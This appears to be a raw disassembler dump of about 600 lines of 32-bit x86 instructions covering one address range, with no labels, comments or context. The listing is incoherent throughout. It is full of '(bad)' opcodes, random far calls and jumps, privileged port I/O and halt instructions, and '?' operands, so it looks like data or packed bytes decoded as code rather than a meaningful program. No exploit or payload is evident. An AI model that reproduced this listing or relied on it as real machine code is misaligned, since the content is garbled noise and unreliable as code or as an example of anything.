  6a9540:	js     0x6a9533
  6a9542:	push   cs
  6a9543:	or     al,0xe
  6a9545:	pop    cx
  6a9547:	mov    edi,0x5babd400
  6a954c:	mov    edi,0x454b3b23
  6a9551:	sub    al,0x8c
  6a9553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a9554:	add    bl,0x1c
  6a9557:	rcr    DWORD PTR [esi],cl
  6a9559:	cmp    esp,DWORD PTR [eax]
  6a955b:	and    al,0xf9
  6a955d:	push   edi
  6a955e:	sub    DWORD PTR [ecx],0x151cf98f
  6a9564:	call   0x6035:0x892cdda5
  6a956b:	mov    ds:0x3e760855,eax
  6a9570:	stos   DWORD PTR es:[edi],eax
  6a9571:	pop    edx
  6a9572:	adc    DWORD PTR [eax],esp
  6a9574:	mov    bh,0x4f
  6a9576:	mov    eax,ds:0x6ea45980
  6a957b:	and    eax,0x163fb33d
  6a9580:	push   0xffffffe9
  6a9582:	pop    ecx
  6a9583:	and    al,0x13
  6a9585:	or     cl,BYTE PTR [edx-0x1b53c87f]
  6a958b:	dec    ecx
  6a958c:	xchg   DWORD PTR [ebx],edx
  6a958e:	pop    ebp
  6a958f:	hlt    
  6a9590:	test   eax,0xae2c42e8
  6a9595:	aas    
  6a9596:	aas    
  6a9597:	xchg   BYTE PTR [ebx+0x64],ch
  6a959a:	inc    esi
  6a959b:	fld    st(4)
  6a959d:	or     DWORD PTR ds:0x28fabac5,ebx
  6a95a3:	xor    DWORD PTR [ebx+0x17ad7d08],edi
  6a95a9:	shl    BYTE PTR [ebx+ebp*2],0xd4
  6a95ad:	sbb    al,0x4d
  6a95af:	mov    edi,0x63635880
  6a95b4:	fldcw  WORD PTR [esi]
  6a95b6:	scas   al,BYTE PTR es:[edi]
  6a95b7:	or     esp,0x13
  6a95ba:	out    0x52,al
  6a95bc:	pushw  ds
  6a95be:	push   ebx
  6a95bf:	ret    0xad5a
  6a95c2:	jg     0x6a95f6
  6a95c4:	jo     0x6a956f
  6a95c6:	out    dx,eax
  6a95c7:	inc    esi
  6a95c8:	jne    0x6a95d8
  6a95ca:	test   BYTE PTR fs:[ebp-0x3a67c81d],0x98
  6a95d2:	inc    esi
  6a95d3:	(bad)  
  6a95d4:	mov    bh,0x96
  6a95d6:	dec    edx
  6a95d7:	cwde   
  6a95d8:	stos   DWORD PTR es:[edi],eax
  6a95d9:	or     edi,0x4161e775
  6a95df:	fmul   st,st(0)
  6a95e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a95e2:	lock call 0xbca7:0x1dbd0278
  6a95ea:	cwde   
  6a95eb:	lods   al,BYTE PTR ds:[esi]
  6a95ec:	leave  
  6a95ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a95ee:	(bad)
  6a95f2:	call   0xca4:0x59d6f447
  6a95f9:	cmp    al,0x2e
  6a95fb:	sub    al,0xcb
  6a95fd:	repnz sahf 
  6a95ff:	int3   
  6a9600:	pushf  
  6a9601:	jge    0x6a959b
  6a9603:	aam    0xbb
  6a9605:	in     al,0x6a
  6a9607:	or     esi,0xdb750689
  6a960d:	mov    esp,0xfc345bd
  6a9612:	fisttp WORD PTR [edi+eax*8]
  6a9615:	addr16 test eax,0xb8383e00
  6a961b:	or     ebp,DWORD PTR [eax-0x49]
  6a961e:	ficomp WORD PTR [edi+0x29e6e40d]
  6a9624:	mov    ds:0x70ebe4c0,al
  6a9629:	jnp    0x6a95bb
  6a962b:	push   0x80dd69ca
  6a9630:	and    ecx,edi
  6a9632:	xchg   esp,eax
  6a9633:	xchg   ecx,eax
  6a9634:	sub    ah,bh
  6a9636:	ret    0x23e2
  6a9639:	add    edi,DWORD PTR [ecx+edi*8-0x62f7a7bf]
  6a9640:	push   edi
  6a9641:	jno    0x6a96bf
  6a9643:	cmp    al,0xed
  6a9645:	fiadd  DWORD PTR [esi]
  6a9647:	out    dx,eax
  6a9648:	add    edx,DWORD PTR [edx+eax*2+0x8]
  6a964c:	sbb    BYTE PTR [bx+di+0x3da5],cl
  6a9651:	add    al,0xc7
  6a9653:	push   ebx
  6a9654:	(bad)  
  6a9655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a9656:	ja     0x6a9620
  6a9658:	pop    ds
  6a9659:	inc    esi
  6a965a:	js     0x6a969d
  6a965c:	ds jmp 0x6a96dd
  6a965f:	pop    esi
  6a9660:	push   edx
  6a9661:	stos   DWORD PTR es:[edi],eax
  6a9662:	imul   edi,ebp,0x3b379f2
  6a9668:	add    DWORD PTR ss:[esi],esp
  6a966b:	test   BYTE PTR [eax-0x5c],0x78
  6a966f:	scas   eax,DWORD PTR es:[edi]
  6a9670:	xor    bh,BYTE PTR [edi+0x27]
  6a9673:	(bad)  
  6a9674:	call   0x1b580936
  6a9679:	jge    0x6a966e
  6a967b:	pop    esp
  6a967c:	fld    st(4)
  6a967e:	je     0x6a96f4
  6a9680:	mov    ch,0xe4
  6a9682:	test   BYTE PTR [edi+0x5a4e8b68],dl
  6a9688:	out    dx,al
  6a9689:	(bad)  
  6a968a:	dec    edi
  6a968b:	jge    0x6a9702
  6a968d:	cwde   
  6a968e:	adc    DWORD PTR [ecx+0x3205c1ef],edi
  6a9694:	in     al,0x48
  6a9696:	mov    al,0x6c
  6a9698:	ret    0x8277
  6a969b:	jno    0x6a9674
  6a969d:	push   edi
  6a969e:	test   DWORD PTR [edx-0x3ec6b0b1],ebx
  6a96a4:	fldcw  WORD PTR ds:0xdf85ee0d
  6a96aa:	(bad)  
  6a96ab:	out    dx,al
  6a96ac:	in     al,dx
  6a96ad:	sbb    ch,BYTE PTR [ecx-0x6fd8a17a]
  6a96b3:	gs dec esp
  6a96b5:	mov    al,0x37
  6a96b7:	rcr    DWORD PTR [ebx],cl
  6a96b9:	rcr    BYTE PTR [ebx-0x3],cl
  6a96bc:	test   DWORD PTR [esi],esi
  6a96be:	cdq    
  6a96bf:	(bad)  
  6a96c0:	push   edx
  6a96c1:	into   
  6a96c2:	xor    BYTE PTR [edi-0x47b472bd],al
  6a96c8:	xchg   ebp,eax
  6a96c9:	fcom   DWORD PTR [eax-0x65f94e18]
  6a96cf:	mov    eax,0xffd3f77f
  6a96d4:	pop    esp
  6a96d5:	mov    ch,0xbe
  6a96d7:	cmp    al,BYTE PTR [ebx+0x6879f4d2]
  6a96dd:	pop    edx
  6a96de:	call   0x9930:0x8c102e2
  6a96e5:	test   al,0x68
  6a96e7:	or     cl,BYTE PTR [edi+0x28]
  6a96ea:	and    esi,DWORD PTR [edx]
  6a96ec:	sub    al,0xab
  6a96ee:	jns    0x6a96ac
  6a96f0:	je     0x6a971a
  6a96f2:	js     0x6a969e
  6a96f4:	or     al,0x28
  6a96f6:	pop    ds
  6a96f7:	mov    cl,0x6
  6a96f9:	mov    ch,0x6f
  6a96fb:	mov    ebx,0x9b873145
  6a9700:	or     eax,0x27766aeb
  6a9705:	or     eax,0xdbf31634
  6a970a:	lock and bh,al
  6a970d:	shl    BYTE PTR [edx],0xf3
  6a9710:	mov    edx,0x8921faa6
  6a9715:	fidiv  WORD PTR [ebx-0x11c7fdbb]
  6a971b:	(bad)  
  6a971c:	and    al,0x2a
  6a971e:	sbb    eax,0x5f005d52
  6a9723:	shl    BYTE PTR [esi-0x6390abdf],1
  6a9729:	aam    0x1d
  6a972b:	push   DWORD PTR [edx+0x25f1d8a4]
  6a9731:	dec    ecx
  6a9732:	cmc    
  6a9733:	mov    eax,ds:0xe413ede8
  6a9738:	xor    dh,BYTE PTR [ebx+0x113d60e8]
  6a973e:	(bad)  
  6a973f:	pusha  
  6a9740:	pop    ss
  6a9741:	pop    ebx
  6a9742:	jl     0x6a9712
  6a9744:	ss jecxz 0x6a97a1
  6a9747:	cli    
  6a9748:	in     al,dx
  6a9749:	(bad)
  6a974d:	inc    eax
  6a974e:	push   0x49e10863
  6a9753:	data16 rcr BYTE PTR [ebx+0x523c57af],0xd4
  6a975b:	push   esi
  6a975c:	jl     0x6a96f4
  6a975e:	and    dh,bh
  6a9760:	xor    DWORD PTR ss:[edi+0x4dbf92d3],esp
  6a9767:	push   ds
  6a9768:	hlt    
  6a9769:	mov    ds:0x791f2347,al
  6a976e:	(bad)  
  6a9770:	add    ecx,DWORD PTR [ebx+0x51]
  6a9773:	dec    edx
  6a9774:	xor    DWORD PTR [eiz*2+0x76c2ed4c],0xfa85d8f3
  6a977f:	xor    dh,BYTE PTR [ebp-0x1bbab94d]
  6a9785:	out    dx,al
  6a9786:	pop    eax
  6a9787:	gs mov dh,0xca
  6a978a:	and    BYTE PTR [ebx],0xcf
  6a978d:	jae    0x6a97ba
  6a978f:	add    DWORD PTR [eax-0x69],ebx
  6a9792:	dec    edi
  6a9793:	rcr    DWORD PTR cs:[ecx],cl
  6a9796:	and    DWORD PTR [ebp+0x5ec9838d],esp
  6a979c:	push   ebp
  6a979d:	pop    esi
  6a979e:	imul   esp,DWORD PTR ss:[eax+0x3a],0xb1c88da6
  6a97a6:	aad    0xce
  6a97a8:	push   0x67
  6a97aa:	adc    ah,0x87
  6a97ad:	push   ss
  6a97ae:	xchg   esi,eax
  6a97af:	and    al,0x5
  6a97b1:	xlat   BYTE PTR ds:[ebx]
  6a97b2:	je     0x6a9778
  6a97b4:	adc    esp,DWORD PTR [esi]
  6a97b6:	rcl    DWORD PTR [edi+0x2e],cl
  6a97b9:	shl    DWORD PTR [esi],1
  6a97bb:	push   ebx
  6a97bc:	mov    al,0x25
  6a97be:	jecxz  0x6a980b
  6a97c0:	pushf  
  6a97c1:	and    bh,al
  6a97c3:	nop
  6a97c4:	loopne 0x6a97ab
  6a97c6:	add    BYTE PTR [edi],bh
  6a97c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a97c9:	idiv   BYTE PTR [edx+0xb]
  6a97cc:	jl     0x6a984d
  6a97ce:	mov    ebp,0x4cadceb4
  6a97d3:	(bad)  
  6a97d4:	cmp    BYTE PTR [edx-0x38],dl
  6a97d7:	push   0xfa19ac33
  6a97dc:	mov    ebx,0xcde86ce7
  6a97e1:	pop    es
  6a97e2:	in     al,dx
  6a97e3:	inc    edi
  6a97e4:	das    
  6a97e5:	cvtps2pd xmm4,QWORD PTR [esi-0x51581a07]
  6a97ec:	mov    esp,0xd9b73d00
  6a97f1:	or     al,0x97
  6a97f3:	fcmove st,st(1)
  6a97f5:	sbb    eax,0xc7003311
  6a97fa:	and    DWORD PTR [ecx-0x5e0e2c21],0xd169bf6
  6a9804:	push   edi
  6a9805:	retf   0x843
  6a9808:	jle    0x6a97a1
  6a980a:	sub    BYTE PTR [edx],al
  6a980c:	fild   DWORD PTR [edi+0x67]
  6a980f:	mov    gs,WORD PTR [edx+0x1f]
  6a9812:	pop    ds
  6a9813:	and    al,0x1e
  6a9815:	bnd jne 0x6a97c5
  6a9818:	(bad)  
  6a9819:	popa   
  6a981a:	mov    edi,0x2cdcf022
  6a981f:	lods   al,BYTE PTR ds:[esi]
  6a9820:	fmul   st(5),st
  6a9822:	addr16 jmp ebp
  6a9825:	icebp  
  6a9826:	mov    dh,0x47
  6a9828:	js     0x6a983d
  6a982a:	sbb    bh,BYTE PTR [eax-0x23b7e38c]
  6a9830:	stc    
  6a9831:	xor    DWORD PTR [edi-0x20],0xffffffb1
  6a9835:	test   DWORD PTR [ebp+ebx*4+0x4d8dcf01],eax
  6a983c:	mov    esp,0x57e3e51f
  6a9841:	xor    edx,DWORD PTR [ebx]
  6a9843:	mov    ch,0xa6
  6a9845:	outs   dx,DWORD PTR ds:[esi]
  6a9846:	xchg   esi,eax
  6a9847:	pop    ss
  6a9848:	test   DWORD PTR [ebp+0x2fd11288],eax
  6a984e:	fwait
  6a984f:	push   ebp
  6a9850:	dec    edx
  6a9851:	dec    ebx
  6a9852:	jb     0x6a97d9
  6a9854:	ds retf 0xe583
  6a9858:	mov    ?,WORD PTR [edx+edi*2]
  6a985b:	outs   dx,BYTE PTR ds:[esi]
  6a985c:	stos   BYTE PTR es:[edi],al
  6a985d:	or     eax,0x4b3c7872
  6a9862:	and    al,0x3
  6a9864:	jns    0x6a98a2
  6a9866:	ss cwde 
  6a9868:	sbb    ecx,DWORD PTR [edx]
  6a986a:	ror    BYTE PTR [ebx],cl
  6a986c:	test   eax,0x11e5e546
  6a9871:	mov    edi,0x2eb6bd5e
  6a9876:	push   cs
  6a9877:	xchg   DWORD PTR [ebx+0x8],edi
  6a987a:	pushf  
  6a987b:	xor    al,0x3b
  6a987d:	xchg   edx,eax
  6a987e:	cwde   
  6a987f:	cmp    esp,DWORD PTR [ecx-0x45]
  6a9882:	mov    ah,0x6b
  6a9884:	daa    
  6a9885:	jb     0x6a98d9
  6a9887:	and    al,0xa
  6a9889:	pop    esp
  6a988a:	lea    edx,ds:0x9ef15041
  6a9890:	stc    
  6a9891:	mov    eax,ds:0xed471c93
  6a9896:	mov    DWORD PTR [ebp-0x1f],edx
  6a9899:	pop    esi
  6a989a:	xor    BYTE PTR ds:0x44ec2efe,bh
  6a98a0:	in     eax,dx
  6a98a1:	push   ebp
  6a98a2:	outs   dx,DWORD PTR ds:[esi]
  6a98a3:	xor    DWORD PTR es:[edi],ebx
  6a98a6:	addr16 inc eax
  6a98a8:	dec    edx
  6a98a9:	outs   dx,BYTE PTR ds:[esi]
  6a98aa:	jb     0x6a9883
  6a98ac:	push   cs
  6a98ad:	hlt    
  6a98ae:	(bad)  
  6a98b0:	mov    dh,0xa7
  6a98b2:	adc    DWORD PTR [esi-0xd],edx
  6a98b5:	xlat   BYTE PTR ds:[ebx]
  6a98b6:	fmul   st,st(2)
  6a98b8:	inc    ebx
  6a98b9:	js     0x6a985c
  6a98bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a98bc:	pusha  
  6a98bd:	dec    ecx
  6a98be:	mov    esi,0x31338afa
  6a98c3:	dec    esi
  6a98c4:	cmp    ebp,esp
  6a98c6:	adc    al,0x63
  6a98c8:	cmp    DWORD PTR [ecx+0xd],edx
  6a98cb:	push   esi
  6a98cc:	dec    esp
  6a98cd:	adc    dl,cl
  6a98cf:	xchg   esp,eax
  6a98d0:	in     al,0x93
  6a98d2:	xor    BYTE PTR [esi],0x13
  6a98d5:	mov    edi,0xfd2951a2
  6a98da:	sub    BYTE PTR [edx+eax*1-0x71],ah
  6a98de:	or     dh,BYTE PTR ds:0x5c331bdc
  6a98e4:	int    0x3
  6a98e6:	sahf   
  6a98e7:	xor    eax,0xb9bc4be6
  6a98ec:	push   esp
  6a98ed:	getsec 
  6a98ef:	dec    eax
  6a98f0:	push   ss
  6a98f1:	pushf  
  6a98f2:	mov    cs,WORD PTR [edx+0x28c58b46]
  6a98f8:	sbb    esi,0xe
  6a98fb:	fwait
  6a98fc:	sti    
  6a98fd:	push   es
  6a98fe:	fidiv  DWORD PTR [ecx+edi*1+0x7d]
  6a9902:	add    ebp,DWORD PTR [ecx+0x4879476b]
  6a9908:	mov    BYTE PTR [ecx+esi*8+0x1d288c23],ah
  6a990f:	(bad)  
  6a9910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a9911:	pop    esp
  6a9912:	popa   
  6a9913:	or     eax,0x54d39e21
  6a9918:	std    
  6a9919:	mov    esi,0x89ca786
  6a991e:	mov    edx,0x1dc057dd
  6a9923:	mov    ebx,0x8d19bac7
  6a9928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a9929:	sbb    edi,DWORD PTR [esi+0x38]
  6a992c:	lock (bad) 
  6a992e:	mov    eax,0x7b72f12a
  6a9933:	loope  0x6a991c
  6a9935:	mov    bh,0x37
  6a9937:	retf   0xbbf0
  6a993a:	inc    ebx
  6a993b:	pushf  
  6a993c:	adc    ebp,edi
  6a993e:	(bad)  
  6a993f:	ror    BYTE PTR ds:0xed64e440,1
  6a9945:	(bad)  
  6a9946:	sbb    DWORD PTR [edx-0x50850f62],ebp
  6a994c:	ror    edx,cl
  6a994e:	cmp    esp,DWORD PTR [ebp-0x80]
  6a9951:	std    
  6a9952:	inc    edi
  6a9953:	data16 jo 0x6a992f
  6a9956:	add    ebx,esi
  6a9958:	mov    cl,0x49
  6a995a:	mov    ds:0xf788159d,al
  6a995f:	dec    esp
  6a9960:	fdiv   QWORD PTR [ebp-0x5ea328dd]
  6a9966:	add    eax,0x66e753cd
  6a996b:	pop    ebx
  6a996c:	js     0x6a99cf
  6a996e:	not    ebx
  6a9970:	outs   dx,BYTE PTR ds:[esi]
  6a9971:	out    0x30,eax
  6a9973:	das    
  6a9974:	mov    dh,0x1b
  6a9976:	stc    
  6a9977:	mov    esi,DWORD PTR [ebx-0x13]
  6a997a:	es mov ah,0x8a
  6a997d:	nop
  6a997e:	push   edi
  6a997f:	add    DWORD PTR [ecx],esi
  6a9981:	jno    0x6a995f
  6a9983:	daa    
  6a9984:	sbb    DWORD PTR [edx],edi
  6a9986:	rcl    BYTE PTR [edi+0x3c6164fd],1
  6a998c:	dec    esp
  6a998d:	or     BYTE PTR [ebp-0x707a34f0],dh
  6a9993:	mov    ch,0xcd
  6a9995:	test   eax,0x4659ee82
  6a999a:	in     al,dx
  6a999b:	sbb    DWORD PTR [eax+0x76332017],eax
  6a99a1:	lock fsubrp st(3),st
  6a99a4:	push   esp
  6a99a5:	lock ins BYTE PTR es:[edi],dx
  6a99a7:	xchg   edx,eax
  6a99a8:	cmc    
  6a99a9:	out    0x21,al
  6a99ab:	stc    
  6a99ac:	push   cs
  6a99ad:	std    
  6a99ae:	lods   eax,DWORD PTR ds:[esi]
  6a99af:	mov    al,0xbc
  6a99b1:	cmp    edx,DWORD PTR [ebx+0x2285821a]
  6a99b7:	into   
  6a99b8:	popf   
  6a99b9:	cld    
  6a99ba:	xchg   edx,eax
  6a99bb:	sub    ch,BYTE PTR [ebp+ebp*1-0x79897041]
  6a99c2:	push   edi
  6a99c3:	lea    esp,[eax+edi*1]
  6a99c6:	push   esp
  6a99c7:	jnp    0x6a9a05
  6a99c9:	ss and cl,cl
  6a99cc:	sub    edi,DWORD PTR [esp+edi*8+0x22]
  6a99d0:	call   0xc7786ce7
  6a99d5:	xchg   ebp,eax
  6a99d6:	ins    DWORD PTR es:[edi],dx
  6a99d7:	sbb    BYTE PTR [ebx+0x9],ah
  6a99da:	jnp    0x6a9a14
  6a99dc:	sub    eax,0x8a00e0c6
  6a99e1:	or     BYTE PTR [ebx-0x23],dh
  6a99e4:	cwde   
  6a99e5:	or     bh,BYTE PTR [edx-0x7ba98b6b]
  6a99eb:	pop    edi
  6a99ec:	dec    edx
  6a99ed:	test   BYTE PTR [esi-0x1c],al
  6a99f0:	xchg   edx,eax
  6a99f1:	and    eax,0xad36d25c
  6a99f6:	ds (bad) 
  6a99f8:	popf   
  6a99f9:	jl     0x6a9a42
  6a99fb:	mov    ch,0x66
  6a99fd:	cli    
  6a99fe:	call   DWORD PTR [ecx-0x76a64f29]
  6a9a04:	pop    ds
  6a9a05:	sbb    al,0x84
  6a9a07:	out    dx,eax
  6a9a08:	js     0x6a9991
  6a9a0a:	pop    ss
  6a9a0b:	mov    edx,0x8ebf31fc
  6a9a10:	mov    eax,0x1f4deaba
  6a9a15:	repnz pop ds
  6a9a17:	lahf   
  6a9a18:	xchg   ecx,eax
  6a9a19:	xchg   DWORD PTR [edx],edx
  6a9a1b:	shr    BYTE PTR [ebx+0x661d3978],1
  6a9a21:	cmp    al,0x6c
  6a9a23:	fwait
  6a9a24:	adc    edi,DWORD PTR [esi]
  6a9a26:	mov    BYTE PTR [ebx+edx*1],dl
  6a9a29:	fsubr  DWORD PTR [ebx+0x44]
  6a9a2c:	add    BYTE PTR [eax],ch
  6a9a2e:	adc    al,0x14
  6a9a30:	push   es
  6a9a31:	xor    cl,BYTE PTR [edi+0x61567984]
  6a9a37:	and    BYTE PTR [ebp+eiz*8-0x2a],ah
  6a9a3b:	aad    0x2
  6a9a3d:	or     dh,BYTE PTR [ecx-0x53]
  6a9a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a9a41:	cmp    eax,0xb17556fa
  6a9a46:	fnstcw WORD PTR [edx-0x1e]
  6a9a49:	sbb    eax,0xdec7e558
  6a9a4e:	stc    
  6a9a4f:	pop    ds
  6a9a50:	mov    al,0x81
  6a9a52:	dec    esi
  6a9a53:	cwde   
  6a9a54:	xor    al,0x7a
  6a9a56:	dec    esi
  6a9a57:	out    0x94,eax
  6a9a59:	push   es
  6a9a5a:	add    eax,0xd7221cbd
  6a9a5f:	jno    0x6a9a63
  6a9a61:	ss inc edx
  6a9a63:	lds    esi,FWORD PTR [ecx-0x70]
  6a9a66:	lock jo 0x6a9a23
  6a9a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a9a6a:	mov    dh,0xb4
  6a9a6c:	inc    ebx
  6a9a6d:	xor    ebp,DWORD PTR [edi]
  6a9a6f:	call   0x2d7db61e
  6a9a74:	and    ah,0xc5
  6a9a77:	mov    bl,BYTE PTR [ecx]
  6a9a79:	arpl   WORD PTR [esi+0x31],bx
  6a9a7c:	dec    edx
  6a9a7d:	jmp    0xd02f3515
  6a9a82:	dec    edx
  6a9a83:	test   bh,bh
  6a9a85:	cmp    edx,DWORD PTR [edi]
  6a9a87:	int3   
  6a9a88:	pop    ecx
  6a9a89:	xor    esp,DWORD PTR [edi]
  6a9a8b:	call   0x4b57:0x402bb32f
  6a9a92:	cli    
  6a9a93:	inc    edi
  6a9a94:	pop    es
  6a9a95:	jns    0x6a9a40
  6a9a97:	cmp    esp,edi
  6a9a99:	lahf   
  6a9a9a:	call   0x5b67:0x76589254
  6a9aa1:	fadd   QWORD PTR [eax-0x51]
  6a9aa4:	cmp    eax,0x6d5b5ae7
  6a9aa9:	mov    edi,0x953d8ac8
  6a9aae:	fwait
  6a9aaf:	call   FWORD PTR [ecx-0x30c52111]
  6a9ab5:	mov    edi,0x52ebceee
  6a9aba:	pop    ecx
  6a9abb:	sbb    esp,DWORD PTR [edi+ebx*1]
  6a9abe:	or     ah,BYTE PTR [esi]
  6a9ac0:	ds iret 
  6a9ac2:	in     al,0x50
  6a9ac4:	addr16 mov ebx,0x58f6bdb7
  6a9aca:	and    cl,ch
  6a9acc:	sbb    edi,DWORD PTR [ebx-0x2300a6ce]
  6a9ad2:	in     al,0x77
  6a9ad4:	cmp    al,0xe3
  6a9ad6:	ss push ebx
  6a9ad8:	sbb    ebp,esi
  6a9ada:	or     BYTE PTR [edi+eiz*1],al
  6a9add:	mov    esp,0x48e2119f
  6a9ae2:	cdq    
  6a9ae3:	fcom   st(6)
  6a9ae5:	pop    esp
  6a9ae6:	jle    0x6a9afa
  6a9ae8:	outs   dx,DWORD PTR ds:[esi]
  6a9ae9:	mov    edx,DWORD PTR [edi-0x1d]
  6a9aec:	jnp    0x6a9ad5
  6a9aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a9aef:	stc    
  6a9af0:	mov    eax,0xba688105
  6a9af5:	lds    esi,FWORD PTR [edi-0x2624536a]
  6a9afb:	fwait
  6a9afc:	shr    BYTE PTR [ebx-0x66],0xd
  6a9b00:	dec    edx
  6a9b01:	pop    esi
  6a9b02:	in     eax,0x47
  6a9b04:	add    DWORD PTR [edi+esi*8-0x1a274e23],esi
  6a9b0b:	int3   
  6a9b0c:	in     al,0xd3
  6a9b0e:	xchg   DWORD PTR [eax],edx
  6a9b10:	or     BYTE PTR [eax-0x4ba4bf6e],ch
  6a9b16:	xchg   esp,eax
  6a9b17:	add    al,0xa0
  6a9b19:	jmp    0x5f6c:0x320c7195
  6a9b20:	es cmp al,0x8d
  6a9b23:	retf   
  6a9b24:	jl     0x6a9b4e
  6a9b26:	aaa    
  6a9b27:	loopne 0x6a9ab0
  6a9b29:	or     DWORD PTR [ecx+0x4c],0x6fe2715b
  6a9b30:	push   ecx
  6a9b31:	push   0x2c
  6a9b33:	adc    al,0xaf
  6a9b35:	push   ds
  6a9b36:	mov    WORD PTR [ecx],fs
  6a9b38:	sti    
  6a9b39:	mov    ch,BYTE PTR [edx]
  6a9b3b:	dec    ebx
  6a9b3c:	(bad)  
  6a9b3e:	sahf   
  6a9b3f:	aad    0x2f
  6a9b41:	adc    esp,eax
  6a9b43:	xchg   edi,eax
  6a9b44:	mov    ecx,0x98c7f404
  6a9b49:	pop    eax
  6a9b4a:	and    ch,BYTE PTR [esi+0x31]
  6a9b4d:	ja     0x6a9bca
  6a9b4f:	es and eax,0x2f3e8d4a
  6a9b55:	shl    DWORD PTR [ebx-0x52],0x8a
  6a9b59:	sbb    ecx,edi
  6a9b5b:	adc    al,0x51
  6a9b5d:	jle    0x6a9b00
  6a9b5f:	(bad)  
  6a9b60:	pop    esi
  6a9b61:	or     esp,DWORD PTR [eax+0x56267be1]
  6a9b67:	add    esi,DWORD PTR [eax+0x30186153]
  6a9b6d:	push   DWORD PTR [ecx]
  6a9b6f:	jnp    0x6a9bde
  6a9b71:	mov    ch,BYTE PTR [ebp+0x1c]
  6a9b74:	into   
  6a9b75:	jbe    0x6a9b5b
  6a9b77:	mov    eax,DWORD PTR [esi]
  6a9b79:	jne    0x6a9bfa
  6a9b7b:	lock das 
  6a9b7d:	push   esp
  6a9b7e:	out    0x4f,eax
  6a9b80:	push   eax
  6a9b81:	pop    ecx
  6a9b82:	pop    edi
  6a9b83:	push   ecx
  6a9b84:	inc    ecx
  6a9b85:	hlt    
  6a9b86:	fsubr  QWORD PTR [edi-0x1]
  6a9b89:	cmp    esp,esi
  6a9b8b:	dec    ecx
  6a9b8c:	out    0x12,al
  6a9b8e:	push   ecx
  6a9b8f:	mov    dh,0x2c
  6a9b91:	loopne 0x6a9b47
  6a9b93:	cwde   
  6a9b94:	mov    dl,0x35
  6a9b96:	push   ebp
  6a9b97:	dec    eax
  6a9b98:	jno    0x6a9b99
  6a9b9a:	outs   dx,BYTE PTR ds:[esi]
  6a9b9b:	push   cs
  6a9b9c:	(bad)  
  6a9b9d:	jg     0x6a9b20
  6a9b9f:	dec    esp
  6a9ba0:	cmp    DWORD PTR [edx+ebx*4-0xad9839],edx
  6a9ba7:	(bad)  
  6a9ba8:	sub    eax,0x397203b4
  6a9bad:	aam    0xeb
  6a9baf:	stos   BYTE PTR es:[edi],al
  6a9bb0:	jmp    0x6a9b78
  6a9bb2:	push   ds
  6a9bb3:	fmul   st(1),st
  6a9bb5:	add    eax,DWORD PTR ds:0xaded73e1
  6a9bbb:	out    dx,eax
  6a9bbc:	jo     0x6a9b4c
  6a9bbe:	pop    esp
  6a9bbf:	inc    edi
  6a9bc0:	xor    BYTE PTR [ecx],al
  6a9bc2:	sar    ah,cl
  6a9bc4:	mov    ebx,0xe8660262
  6a9bc9:	pop    ds
  6a9bca:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  6a9bcc:	jo     0x6a9b67
  6a9bce:	int3   
  6a9bcf:	sub    BYTE PTR [esi+ebx*2-0x31],al
  6a9bd3:	leave  
  6a9bd4:	sub    al,0x29
  6a9bd6:	dec    esp
  6a9bd7:	mov    WORD PTR [ecx-0x33ab0182],?
  6a9bdd:	xor    dh,BYTE PTR [eax+0x787fc947]
  6a9be3:	sahf   
  6a9be4:	mov    dl,0xa3
  6a9be6:	sar    BYTE PTR [edi*8-0x37f5b153],1
  6a9bed:	dec    edi
  6a9bee:	lods   al,BYTE PTR ds:[esi]
  6a9bef:	sub    eax,0x46736a17
  6a9bf4:	std    
  6a9bf5:	adc    dl,dl
  6a9bf7:	pop    ebx
  6a9bf8:	loopne 0x6a9b86
  6a9bfa:	in     eax,0xab
  6a9bfc:	add    BYTE PTR [edx-0x11],al
  6a9bff:	mov    edi,0x6433880b
  6a9c04:	jmp    0x6a9ba7
  6a9c06:	ret    0x6e57
  6a9c09:	sub    al,0x23
  6a9c0b:	aad    0x9b
  6a9c0d:	mov    esp,0x9e5cbfc7
  6a9c12:	imul   esi,DWORD PTR [ecx+0x78015267],0xff70ef07
  6a9c1c:	in     eax,dx
  6a9c1d:	mov    DWORD PTR [edx],edx
  6a9c1f:	push   ebp
  6a9c20:	das    
  6a9c21:	les    eax,FWORD PTR [eax-0x6f8f39c4]
  6a9c27:	push   ecx
  6a9c28:	mov    al,0x26
  6a9c2a:	cmp    ecx,DWORD PTR [ecx+0x45]
  6a9c2d:	sub    BYTE PTR [esi+0x47d8c601],al
  6a9c33:	adc    DWORD PTR [edx-0x2b2889a2],ecx
  6a9c39:	shr    eax,cl
  6a9c3b:	iret   
  6a9c3c:	fld    QWORD PTR [eax]
  6a9c3e:	lea    ebp,[ebx]
  6a9c40:	cmp    al,0xe7
  6a9c42:	mov    ebp,0x6ff26bc6
  6a9c47:	jbe    0x6a9be4
  6a9c49:	push   cs
  6a9c4a:	or     cl,ch
  6a9c4c:	xor    BYTE PTR [edx-0x234c7c8c],cl
  6a9c52:	out    dx,al
  6a9c53:	ss xchg esp,eax
  6a9c55:	imul   ebp,esp,0x62
  6a9c58:	stos   DWORD PTR es:[edi],eax
  6a9c59:	inc    edx
  6a9c5a:	sub    BYTE PTR [eax-0x6e],dl
  6a9c5d:	push   ds
  6a9c5e:	inc    edi
  6a9c5f:	sub    al,0xae
  6a9c61:	test   eax,0x9a9f221a
  6a9c66:	retf   0xdd65
  6a9c69:	pop    esp
  6a9c6a:	dec    DWORD PTR [ecx-0x78]
  6a9c6d:	popa   
  6a9c6e:	fisubr DWORD PTR [ecx+0x2cd3eb18]
  6a9c74:	sbb    bl,0xe0
  6a9c77:	(bad)  
  6a9c78:	xor    BYTE PTR [edi-0x41],0x6d
  6a9c7c:	in     al,dx
  6a9c7d:	mov    ch,0x3e
  6a9c7f:	adc    DWORD PTR [esi+edi*1-0x7c],eax
  6a9c83:	and    BYTE PTR [edx+0x72],dh
  6a9c86:	popf   
